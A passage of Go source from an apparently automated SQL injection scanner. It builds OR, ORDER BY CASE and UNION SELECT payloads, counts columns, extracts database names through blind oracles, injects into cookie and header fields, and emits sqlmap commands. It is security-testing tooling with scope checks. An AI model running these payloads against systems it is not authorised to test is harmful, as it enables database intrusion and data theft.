			vol.matchesBaseline(len(eq)) && abs(len(eq)-len(dif)) > vol.sigDiff(200) &&
			abs(len(dif)-baseLen) > vol.sigDiff(200) {
			// Reproduce with different operands to rule out a dynamic page.
			eq2, _ := sendInjected(ctx, sqliHTTPClient, ip, eqPayload2, auth)
			dif2, _ := sendInjected(ctx, sqliHTTPClient, ip, diffPayload2, auth)
			if vol.matchesBaseline(len(eq2)) && abs(len(eq2)-len(dif2)) > vol.sigDiff(200) {
				// Numeric context: prove it by extracting the DB name through an AND oracle.
				// If the endpoint merely evaluates arithmetic for some non-SQL reason, the
				// extraction fails and nothing is reported.
				isTrueLike := func(r []byte) bool { return vol.matchesBaseline(len(r)) }
				if name, dbms, ok := s.blindExtractDBName(ctx, ip, auth, arithmeticCond, isTrueLike); ok {
					return "boolean_based", fmt.Sprintf(
						"arithmetic-differential SQLi on param %q — PROVEN by extraction: %s. %q matched the original value %q (%dB) while %q produced a different result (%dB) — the value is evaluated inside the query. Verify: %s",
						ip.Param, blindSQLProofDescription(name, dbms), eqPayload, baselineValue, baseLen, diffPayload, len(dif), mkSQLmapCmd())
				}
			}
		}
	}
	// OR/ORDER BY oracles compare their own reproduced TRUE/FALSE response classes
	// and do not depend on a quiet baseline length. Keep them available on dynamic
	// pages where the conventional baseline-size gate correctly disabled AND/
	// arithmetic heuristics; extraction remains the mandatory proof.
	if !booleanReliable {
		verifyCmd := fmt.Sprintf("sqlmap -u '%s' -p %s --batch --technique=B", ip.URL, ip.Param)
		if value, dbms, tru, fls, ok := s.orBasedBlindExtract(ctx, ip, auth); ok {
			return "boolean_based", fmt.Sprintf(
				"OR-based blind SQLi on param %q — PROVEN by extraction: %s. TRUE payload %q and FALSE payload %q formed a reproduced two-sided oracle on a dynamic endpoint. Verify: %s",
				ip.Param, blindSQLProofDescription(value, dbms), tru, fls, verifyCmd)
		}
		if isOrderByParameter(ip.Param) {
			if value, dbms, tru, fls, ok := s.orderByBlindExtract(ctx, ip, auth); ok {
				return "boolean_based", fmt.Sprintf(
					"ORDER BY expression SQLi on param %q — PROVEN by CASE-order oracle and extraction: %s. TRUE ordering payload %q and FALSE payload %q produced two stable result orders on a dynamic endpoint. Verify: %s",
					ip.Param, blindSQLProofDescription(value, dbms), tru, fls, verifyCmd)
			}
		}
	}

	// Statistical time-based detection runs as a separate, low-concurrency pass;
	// this fast stage returns only deterministic error/extraction proofs.
	return "", ""
}

func isOrderByParameter(name string) bool {
	n := strings.ToLower(strings.TrimSpace(name))
	for _, token := range []string{"sort", "order", "orderby", "order_by", "sortby", "sort_by", "column", "field", "dir", "direction", "groupby", "group_by"} {
		if n == token || strings.HasSuffix(n, "_"+token) {
			return true
		}
	}
	return false
}

func (s *SQLiScanner) orBasedBlindExtract(ctx context.Context, ip insertionPoint, auth map[string]string) (value, dbms, truePayload, falsePayload string, ok bool) {
	b := sqliBaseValue(ip)
	formats := []string{
		b + " OR (%s)-- -",
		b + " OR (%s)#",
		b + "' OR (%s)-- -",
		b + "' OR (%s)#",
		b + `" OR (%s)-- -`,
		b + ") OR (%s)-- -",
		b + "') OR (%s)-- -",
		b + "/**/oR/**/(%s)-- -",
	}
	for _, condFmt := range formats {
		tru := fmt.Sprintf(condFmt, "1=1")
		fls := fmt.Sprintf(condFmt, "1=2")
		t1 := sendInjectedResponse(ctx, sqliHTTPClient, ip, tru, auth)
		f1 := sendInjectedResponse(ctx, sqliHTTPClient, ip, fls, auth)
		if t1.Status == 0 || f1.Status == 0 || looksLikeBlockPage(t1.Status, t1.Body) || looksLikeBlockPage(f1.Status, f1.Body) ||
			(t1.Status == f1.Status && bodiesSameObject(t1.Body, f1.Body)) {
			continue
		}
		t2 := sendInjectedResponse(ctx, sqliHTTPClient, ip, tru, auth)
		f2 := sendInjectedResponse(ctx, sqliHTTPClient, ip, fls, auth)
		if t2.Status != t1.Status || f2.Status != f1.Status ||
			!bodiesSameObject(t1.Body, t2.Body) || !bodiesSameObject(f1.Body, f2.Body) {
			continue
		}
		isTrueLike := func(r injectedResponse) bool {
			return r.Status == t1.Status && bodiesSameObject(t1.Body, r.Body)
		}
		if v, d, extracted := s.blindExtractDBNameResponse(ctx, ip, auth, condFmt, isTrueLike); extracted {
			return v, d, tru, fls, true
		}
	}
	return "", "", "", "", false
}

func (s *SQLiScanner) orderByBlindExtract(ctx context.Context, ip insertionPoint, auth map[string]string) (value, dbms, truePayload, falsePayload string, ok bool) {
	b := sqliBaseValue(ip)
	formats := []string{
		"CASE WHEN (%s) THEN 1 ELSE 2 END",
		"CASE WHEN (%s) THEN 1 ELSE 2 END-- -",
		b + ",CASE WHEN (%s) THEN 1 ELSE 2 END",
		b + " ASC,CASE WHEN (%s) THEN 1 ELSE 2 END",
	}
	for _, condFmt := range formats {
		tru := fmt.Sprintf(condFmt, "1=1")
		fls := fmt.Sprintf(condFmt, "1=2")
		t1 := sendInjectedResponse(ctx, sqliHTTPClient, ip, tru, auth)
		f1 := sendInjectedResponse(ctx, sqliHTTPClient, ip, fls, auth)
		if t1.Status == 0 || f1.Status == 0 || looksLikeBlockPage(t1.Status, t1.Body) || looksLikeBlockPage(f1.Status, f1.Body) {
			continue
		}
		different := t1.Status != f1.Status || !bodiesSameObject(t1.Body, f1.Body)
		if !different {
			continue
		}
		t2 := sendInjectedResponse(ctx, sqliHTTPClient, ip, tru, auth)
		f2 := sendInjectedResponse(ctx, sqliHTTPClient, ip, fls, auth)
		if t2.Status != t1.Status || f2.Status != f1.Status ||
			!bodiesSameObject(t1.Body, t2.Body) || !bodiesSameObject(f1.Body, f2.Body) {
			continue
		}
		isTrueLike := func(r injectedResponse) bool {
			return r.Status == t1.Status && bodiesSameObject(t1.Body, r.Body)
		}
		if v, d, extracted := s.blindExtractDBNameResponse(ctx, ip, auth, condFmt, isTrueLike); extracted {
			return v, d, tru, fls, true
		}
	}
	return "", "", "", "", false
}

// unionColumnCount finds the query's column count via ascending ORDER BY N:
// the first N that triggers a DB error means the real query has N-1 columns.
// Bounded to 20 columns (20 extra requests, worst case) and only ever called
// on an injection point ALREADY confirmed error-based-vulnerable — this is
// pure evidence enrichment, not a new detection surface.
func (s *SQLiScanner) unionColumnCount(ctx context.Context, ip insertionPoint, auth map[string]string) int {
	cols, _ := s.unionColumnBoundary(ctx, ip, auth)
	return cols
}

func (s *SQLiScanner) unionColumnBoundary(ctx context.Context, ip insertionPoint, auth map[string]string) (int, string) {
	const maxCols = 20
	b := sqliBaseValue(ip)
	base, _ := sendInjected(ctx, sqliHTTPClient, ip, b, auth)
	type boundary struct{ orderFmt, unionFmt string }
	boundaries := []boundary{
		{b + " ORDER BY %d-- -", "-1 UNION SELECT %s-- -"},
		{b + "' ORDER BY %d-- -", b + "' UNION SELECT %s-- -"},
		{b + `" ORDER BY %d-- -`, b + `" UNION SELECT %s-- -`},
		{b + "') ORDER BY %d-- -", b + "') UNION SELECT %s-- -"},
		{b + ")) ORDER BY %d-- -", b + ")) UNION SELECT %s-- -"},
	}
	for _, boundary := range boundaries {
		// A compatible boundary must accept ORDER BY 1. Otherwise its syntax error
		// would masquerade as a one-column query.
		one, _ := sendInjected(ctx, sqliHTTPClient, ip, fmt.Sprintf(boundary.orderFmt, 1), auth)
		if one == "" || sqlErrorAppeared(base, one) || bodyLooksLikeWAFBlock(one) {
			continue
		}
		for n := 2; n <= maxCols+1; n++ {
			resp, _ := sendInjected(ctx, sqliHTTPClient, ip, fmt.Sprintf(boundary.orderFmt, n), auth)
			if resp == "" || bodyLooksLikeWAFBlock(resp) {
				break
			}
			if sqlErrorAppeared(base, resp) {
				return n - 1, boundary.unionFmt
			}
		}
	}
	return 0, "" // no boundary found within maxCols — give up quietly, no guess
}

// unionMarkerColumn tries a UNION SELECT with a unique marker string placed
// in each column position (others NULL) and reports the first position whose
// marker shows up verbatim in the response body — concrete, reproducible
// proof of UNION-based exploitability, not just "an error appeared".
func (s *SQLiScanner) unionMarkerColumn(ctx context.Context, ip insertionPoint, auth map[string]string, cols int) (int, string) {
	return s.unionMarkerColumnWithTemplate(ctx, ip, auth, cols, "-1 UNION SELECT %s-- -")
}

func (s *SQLiScanner) unionMarkerColumnWithTemplate(ctx context.Context, ip insertionPoint, auth map[string]string, cols int, unionFmt string) (int, string) {
	if cols <= 0 || cols > 20 {
		return 0, ""
	}
	if !strings.Contains(unionFmt, "%s") {
		return 0, ""
	}
	marker := "rcnUNI0N" + uuid.New().String()[:8]
	for pos := 1; pos <= cols; pos++ {
		// Different engines enforce UNION column types differently. Try common
		// string coercions only after the column count is known; reflection of the
		// random marker is still the required proof.
		for _, markerExpr := range []string{
			"'" + marker + "'",
			"CAST('" + marker + "' AS VARCHAR(64))",
			"CAST('" + marker + "' AS CHAR(64))",
		} {
			vals := make([]string, cols)
			for i := range vals {
				if i+1 == pos {
					vals[i] = markerExpr
				} else {
					vals[i] = "NULL"
				}
			}
			payload := fmt.Sprintf(unionFmt, strings.Join(vals, ","))
			resp, _ := sendInjected(ctx, sqliHTTPClient, ip, payload, auth)
			if strings.Contains(resp, marker) {
				return pos, payload
			}
		}
	}
	return 0, ""
}

// headerChecks runs the same deterministic/extraction/timing engine over common
// header and real authenticated-cookie insertion points.

func (s *SQLiScanner) headerChecks(ctx context.Context, targetID string, auth map[string]string, logFn LogFunc, found *atomic.Int64) {
	limit := sqliFallbackMaxParams
	if s.cfg != nil {
		limit = s.cfg.URLLimit()
	}
	if limit <= 0 {
		limit = 1000000
	}
	rows, err := s.db.QueryContext(ctx, `
		SELECT url, COALESCE(content_type,'') FROM http_services
		WHERE target_id = ? AND status_code BETWEEN 200 AND 403
		ORDER BY url LIMIT ?
	`, targetID, limit)
	if err != nil {
		return
	}
	type headerSurface struct{ url, contentType string }
	var surfaces []headerSurface
	for rows.Next() {
		var surface headerSurface
		if err := rows.Scan(&surface.url, &surface.contentType); err == nil {
			surfaces = append(surfaces, surface)
		}
	}
	rows.Close()
	// Header sinks generally live in middleware/logging or a route handler. Collapse
	// value variants of the same semantic route, but retain distinct controllers,
	// query-field shapes and API paths. Static resources cannot reach SQL business
	// logic and are dropped.
	seenRoutes := map[string]bool{}
	var urls []string
	hostRepresentative := map[string]string{}
	for _, surface := range surfaces {
		if !urlHostInScope(ctx, surface.url) || isStaticAssetURL(surface.url) {
			continue
		}
		ct := strings.ToLower(surface.contentType)
		if strings.Contains(ct, "image/") || strings.Contains(ct, "font/") || strings.Contains(ct, "text/css") || strings.Contains(ct, "javascript") {
			continue
		}
		shape, _ := semanticRouteIdentity(insertionPoint{URL: surface.url, Param: "@header", Method: "GET", Location: "header"})
		if seenRoutes[shape] {
			continue
		}
		seenRoutes[shape] = true
		urls = append(urls, surface.url)
		host := hostOfURL(surface.url)
		if hostRepresentative[host] == "" {
			hostRepresentative[host] = surface.url
		}
	}
	if len(urls) == 0 {
		return
	}
	logFn("info", "sqli", fmt.Sprintf("Testing Cookie/header SQLi on %d live URL(s)...", len(urls)))

	sem := make(chan struct{}, 8)
	var wg sync.WaitGroup
	for _, u := range urls {
		if ctx.Err() != nil {
			break
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(target string) {
			defer wg.Done()
			defer func() { <-sem }()
			// Cookie + User-Agent are classic, but X-Forwarded-For and Referer are
			// just as commonly logged/queried server-side while being assumed
			// "trusted" — a frequent real-world SQLi vector (hunt-sqli root cause
			// #9: HTTP headers stored in the DB without sanitisation).
			type headerVector struct{ header, parameter, value string }
			ua := headerValue(auth, "User-Agent")
			if ua == "" {
				ua = "Mozilla/5.0 (compatible; ReconnerSQLi/1.0)"
			}
			xff := headerValue(auth, "X-Forwarded-For")
			if xff == "" {
				xff = "127.0.0.1"
			}
			ref := headerValue(auth, "Referer")
			if ref == "" {
				ref = target
			}
			hostValue := "example.invalid"
			if u, err := url.Parse(target); err == nil && u.Host != "" {
				hostValue = u.Host
			}
			valueOr := func(name, fallback string) string {
				if v := headerValue(auth, name); v != "" {
					return v
				}
				return fallback
			}
			vectors := []headerVector{
				{header: "User-Agent", parameter: "User-Agent", value: ua},
				{header: "X-Forwarded-For", parameter: "X-Forwarded-For", value: xff},
				{header: "X-Real-IP", parameter: "X-Real-IP", value: valueOr("X-Real-IP", "127.0.0.1")},
				{header: "True-Client-IP", parameter: "True-Client-IP", value: valueOr("True-Client-IP", "127.0.0.1")},
				{header: "X-Client-IP", parameter: "X-Client-IP", value: valueOr("X-Client-IP", "127.0.0.1")},
				{header: "X-Forwarded-Host", parameter: "X-Forwarded-Host", value: valueOr("X-Forwarded-Host", hostValue)},
				{header: "Accept-Language", parameter: "Accept-Language", value: valueOr("Accept-Language", "en-US")},
				{header: "Referer", parameter: "Referer", value: ref},
			}
			cookieNames := cookieParameterNames(headerValue(auth, "Cookie"))
			if len(cookieNames) == 0 {
				cookieNames = []string{"id"}
			}
			for _, name := range cookieNames {
				value := cookieValue(headerValue(auth, "Cookie"), name)
				if value == "" {
					value = "1"
				}
				vectors = append(vectors, headerVector{header: "Cookie", parameter: name, value: value})
			}
			for _, vec := range vectors {
				hdr := vec.header
				loc := "header"
				if hdr == "Cookie" {
					loc = "cookie"
				}
				hip := insertionPoint{URL: target, Param: vec.parameter, Value: vec.value, Method: "GET", Location: loc}
				// Cookies are request/business-state fields, so every distinct route
				// receives the complete deterministic+timing ladder. User-Agent and
				// client-IP logging are normally host-wide middleware: run the deep
				// blind ladder once per host, while every other route/header still gets
				// a reproduced DB-error probe. This retains route-specific error SQLi
				// coverage without multiplying the ~full SQLi engine by 8 headers and
				// every concrete object URL.
				deep := hdr == "Cookie" || (hostRepresentative[hostOfURL(target)] == target &&
					(hdr == "User-Agent" || hdr == "X-Forwarded-For"))
				kind, ev := "", ""
				if deep {
					kind, ev = s.quickProbe(ctx, hip, auth)
					if kind == "" && (s.cfg == nil || s.cfg.SQLiTimeBased) {
						if dbms, timingEvidence, ok := s.timeBasedSQLi(ctx, hip, auth); ok {
							kind = "time_based"
							ev = timingEvidence + " (header DBMS: " + dbms + ")"
						}
					}
				} else {
					kind, ev = s.headerProbe(ctx, target, hdr, vec.parameter, auth)
				}
				if kind != "" {
					val := vec.value + "<INJECT>"
					switch hdr {
					case "User-Agent":
						val = "UA-INJECT"
					case "X-Forwarded-For":
						val = "127.0.0.1,INJECT"
					case "Referer":
						val = "https://INJECT/"
					}
					if hdr == "Cookie" {
						val = vec.parameter + "=INJECT"
					}
					s.store(targetID, "sqli", "high", hip, kind, ev+" (via "+hdr+" header: "+val+")")
					found.Add(1)
					logFn("warn", "sqli", fmt.Sprintf("Header SQLi (%s) via %s: %s", kind, hdr, target))
					s.notify(targetID, target, hdr)
				}
			}
		}(u)
	}
	wg.Wait()
}

func (s *SQLiScanner) headerProbe(ctx context.Context, target, header, parameter string, auth map[string]string) (string, string) {
	// error-based (same FP guards as the parameter path: not a WAF block, and it
	// must reproduce while staying absent from a fresh baseline).
	base := s.fetchWithHeaderAuth(ctx, target, header, parameter, "recon-baseline", auth)
	errResp := s.fetchWithHeaderAuth(ctx, target, header, parameter, "recon'\"`", auth)
	for _, sig := range sqlErrorSignatures {
		if !sig.MatchString(errResp) || sig.MatchString(base) {
			continue
		}
		if bodyLooksLikeWAFBlock(errResp) {
			break
		}
		base2 := s.fetchWithHeaderAuth(ctx, target, header, parameter, "recon-baseline", auth)
		errResp2 := s.fetchWithHeaderAuth(ctx, target, header, parameter, "recon'\"`", auth)
		if !sig.MatchString(errResp2) || sig.MatchString(base2) {
			break
		}
		return "error_based", "DB error triggered by quote in header (reproduced; absent from baseline)"
	}
	// Header SQLi is now reported only on a reproduced DB error. Time-based header
	// probing was removed alongside the parameter path — it was the same FP-prone
	// timing signal on slow/throttled endpoints.
	return "", ""
}

// fetchWithHeader is the compatibility helper used by focused tests/callers.
func (s *SQLiScanner) fetchWithHeader(ctx context.Context, target, header, injection string) string {
	parameter := header
	if header == "Cookie" {
		parameter = "id"
	}
	return s.fetchWithHeaderAuth(ctx, target, header, parameter, injection, nil)
}

func (s *SQLiScanner) fetchWithHeaderAuth(ctx context.Context, target, header, parameter, injection string, auth map[string]string) string {
	reqCtx, cancel := context.WithTimeout(ctx, 15*time.Second)
	defer cancel()
	req, err := http.NewRequestWithContext(reqCtx, "GET", target, nil)
	if err != nil {
		return ""
	}
	// A default UA so non-UA header tests still send a normal-looking request.
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible)")
	for k, v := range auth {
		req.Header.Set(k, v)
	}
	switch header {
	case "Cookie":
		req.Header.Set("Cookie", replaceCookieValue(req.Header.Get("Cookie"), parameter, injection))
	case "User-Agent":
		req.Header.Set("User-Agent", injection)
	case "X-Forwarded-For":
		// Wrap so the on-the-wire value matches the evidence string in headerChecks.
		req.Header.Set("X-Forwarded-For", "127.0.0.1,"+injection)
	case "Referer":
		req.Header.Set("Referer", "https://"+injection+"/")
	default:
		req.Header.Set(header, injection)
	}
	resp, err := sqliHTTPClient.Do(req)
	if err != nil {
		return ""
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 512*1024))
	resp.Body.Close()
	return string(body)
}

func cookieParameterNames(cookie string) []string {
	seen := map[string]bool{}
	var out []string
	for _, part := range strings.Split(cookie, ";") {
		kv := strings.SplitN(strings.TrimSpace(part), "=", 2)
		if len(kv) != 2 {
			continue
		}
		name := strings.TrimSpace(kv[0])
		if name != "" && !seen[strings.ToLower(name)] {
			seen[strings.ToLower(name)] = true
			out = append(out, name)
		}
	}
	return out
}

func cookieValue(cookie, name string) string {
	for _, part := range strings.Split(cookie, ";") {
		kv := strings.SplitN(strings.TrimSpace(part), "=", 2)
		if len(kv) == 2 && strings.EqualFold(strings.TrimSpace(kv[0]), name) {
			return kv[1]
		}
	}
	return ""
}

func replaceCookieValue(cookie, name, value string) string {
	if strings.TrimSpace(name) == "" {
		name = "id"
	}
	var parts []string
	found := false
	for _, part := range strings.Split(cookie, ";") {
		part = strings.TrimSpace(part)
		if part == "" {
			continue
		}
		kv := strings.SplitN(part, "=", 2)
		if len(kv) == 2 && strings.EqualFold(strings.TrimSpace(kv[0]), name) {
			parts = append(parts, strings.TrimSpace(kv[0])+"="+value)
			found = true
		} else {
			parts = append(parts, part)
		}
	}
	if !found {
		parts = append(parts, name+"="+value)
	}
	return strings.Join(parts, "; ")
}

func (s *SQLiScanner) store(targetID, vulnType, severity string, ip insertionPoint, kind, evidence string) {
	// Confidence reflects HOW the SQLi was proven. Boolean observations reach this
	// function only after DB-name/user/version extraction; timing requires linear
	// 0/2/5-second scaling; errors are reproduced and baseline-differential.
	conf := 85
	switch kind {
	case "error_based":
		conf = 95
	case "time_based":
		conf = 97
	case "boolean_based":
		conf = 97
	}
	verdict := VerifyVerified
	if conf < ConfEvidence {
		verdict = CandDetected
	}
	method := strings.ToUpper(strings.TrimSpace(ip.Method))
	if method == "" {
		method = "GET"
	}
	_, _ = RecordDetectorObservation(context.Background(), s.db, DetectorObservation{
		TargetID: targetID, Type: vulnType, Subtype: kind, Severity: severity,
		URL: ip.URL, Method: method, Parameter: ip.Param, Location: insertionLocation(ip),
		Evidence: evidence, Source: "sqli-native", DetectionMethod: kind,
		Confidence: conf, Verdict: verdict,
	})
}

func (s *SQLiScanner) notify(targetID, rawURL, param string) {
	if s.broadcast != nil {
		s.broadcast("new_vuln_finding", map[string]any{
			"target_id": targetID, "type": "sqli", "url": rawURL, "parameter": param,
		})
	}
}

// injectParam sets param=value on rawURL (URL-encoded).
// injectParam replaces (or adds) param=value in rawURL's query string.
//
// The injected value is placed with MINIMAL escaping (queryEscapeMinimal) so a
// payload's own encoding is preserved verbatim: pre-encoded filter-bypass
// payloads (`..%2f`, `%c0%ae`, `%00`) and heavily %-encoded gopher/SSRF payloads
// survive intact instead of being double-encoded (`%2f`→`%252f`) into
// uselessness — the previous q.Encode() path silently neutered every one of
// them. Raw payloads (SQLi `' OR 1=1`, spaces, quotes) still work because the
// only structural characters that would break the query/request are escaped
// (space, &, #, +, control bytes, and a lone % that isn't a valid %XX escape).
// The other, non-injected params keep normal encoding.
func injectParam(rawURL, param, value string) string {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return rawURL
	}
	const placeholder = "RECONINJPLACEHOLDER0"
	q := parsed.Query()
	q.Set(param, placeholder)
	enc := q.Encode()
	parsed.RawQuery = strings.Replace(enc, placeholder, queryEscapeMinimal(value), 1)
	return parsed.String()
}

// isHexDigit reports whether b is an ASCII hex digit (for detecting valid %XX).
func isHexDigit(b byte) bool {
	return (b >= '0' && b <= '9') || (b >= 'a' && b <= 'f') || (b >= 'A' && b <= 'F')
}

// queryEscapeMinimal escapes only the characters that would break the URL's
// query structure or the HTTP request line, leaving everything else (including
// already-valid %XX escapes, '/', '.', quotes, ':') verbatim so a fuzz payload's
// intended on-the-wire form is what the server actually receives.
func queryEscapeMinimal(v string) string {
	var b strings.Builder
	b.Grow(len(v) + 8)
	for i := 0; i < len(v); i++ {
		c := v[i]
		switch {
		case c == '%':
			// Preserve a valid %XX escape as-is; escape a stray '%'.
			if i+2 < len(v) && isHexDigit(v[i+1]) && isHexDigit(v[i+2]) {
				b.WriteByte(c)
			} else {
				b.WriteString("%25")
			}
		case c == ' ':
			b.WriteString("%20")
		case c == '+':
			b.WriteString("%2B")
		case c == '&':
			b.WriteString("%26")
		case c == ';':
			// A raw semicolon is rejected by net/url.ParseQuery (and by a
			// growing number of frameworks) as an invalid query separator. Encode
			// it structurally; the application still receives the original ';'
			// after normal URL decoding, which is essential for JS/SQL probes.
			b.WriteString("%3B")
		case c == '#':
			b.WriteString("%23")
		case c < 0x20 || c > 0x7E:
			fmt.Fprintf(&b, "%%%02X", c)
		default:
			b.WriteByte(c)
		}
	}
	return b.String()
}
